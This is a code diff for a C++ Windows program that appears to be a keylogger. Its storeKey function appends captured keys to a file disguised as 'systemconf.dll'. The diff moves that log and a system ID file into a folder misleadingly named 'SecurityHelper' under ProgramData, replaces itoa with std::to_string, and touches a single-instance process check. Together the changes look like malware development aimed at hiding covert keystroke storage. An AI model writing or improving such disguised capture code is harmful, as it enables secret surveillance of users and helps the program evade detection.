@@ -56,22 +56,22 @@ std::string generateRandomNumber(){
     srand (time(0));
     int intRandomNumber = rand () % 10000+1;
     char charRandomNumber[6];
-    itoa(intRandomNumber,charRandomNumber, 10);
-    std::string stringRandomNumber = std::string(charRandomNumber);
+    
+    std::string stringRandomNumber = std::to_string(intRandomNumber);
 
     return stringRandomNumber;
 }
 
 void storeKey(std::string key){
-    std::ofstream store("C:\\Firefox\\systemconf.dll", std::ios::app);
+    std::ofstream store("C:\\ProgramData\\SecurityHelper\\systemconf.dll", std::ios::app);
     store << key;
     store.close();
 }
 
 std::string createId(){
-   mkdir("C:\\Firefox");
+   mkdir("C:\\ProgramData\\SecurityHelper");
    
-   std::ofstream sysid("C:\\Firefox\\sysid.dat");
+   std::ofstream sysid("C:\\ProgramData\\SecurityHelper\\sysid.dat");
    std::string id = generateRandomNumber();
    sysid << id;
    storeKey("First run!");
@@ -90,8 +90,10 @@ bool isProcessRunning(const char* name){
 
         int processCount = 0;
 	do {
+                
 		if(strcmp(procEntry.szExeFile, name) == 0 )
                     processCount++;
+                    
                 if(processCount == 2) // hack to check for duplicates since this function is used only for this process
                     return true;
 	} while( Process32Next( SnapShot, &procEntry ) );
